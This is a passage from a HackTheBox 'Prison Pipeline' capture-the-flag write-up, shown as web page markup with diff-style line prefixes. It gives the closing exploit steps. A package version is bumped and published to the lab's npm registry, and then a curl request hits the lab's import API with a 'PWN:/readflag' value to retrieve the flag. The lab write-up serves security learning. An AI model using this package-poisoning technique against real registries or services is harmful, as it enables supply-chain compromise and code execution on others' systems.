+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nano package.json
+</span></span></code></pre></div><pre tabindex=0><code>&#34;version&#34;: &#34;1.0.1&#34;,
+</code></pre><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>npm publish --registry<span class=o>=</span>http://registry.prison-pipeline.htb:32828
+</span></span><span class=line><span class=cl>sleep <span class=m>5</span>
+</span></span><span class=line><span class=cl>curl -X POST <span class=s1>&#39;http://94.237.60.154:32828/api/prisoners/import&#39;</span> -H <span class=s1>&#39;Content-Type: application/json&#39;</span> -d <span class=s1>&#39;{&#34;url&#34;: &#34;PWN:/readflag&#34;}&#39;</span>
+</span></span></code></pre></div><h3 id=summary>Summary</h3><p>Prision Pipeline: reduce the custom rules to a scriptable check and use the smallest reliable path to the flag.</p></div><div class=pagination><div class="pagination__buttons pagination__buttons--posts"><a href=/blog/posts/HackTheBox-Potion-Master-Challenge/ class="button inline prev">&lt; [<span class=button__text>HackTheBox Potion Master Challenge</span>]
+</a><span class="page-numbers page-neighbor-sep" aria-hidden=true>::</span>
+<a href=/blog/posts/HackTheBox-Quantum-Conundrum-Challenge/ class="button inline next">[<span class=button__text>HackTheBox Quantum Conundrum Challenge</span>] ></a></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>2026 </span><span>:: <a href=https://github.com/x3ric target=_blank>x3ric</a></span></div></div></footer><script type=text/javascript src=/blog/bundle.min.js></script></div></main></div></body></html>
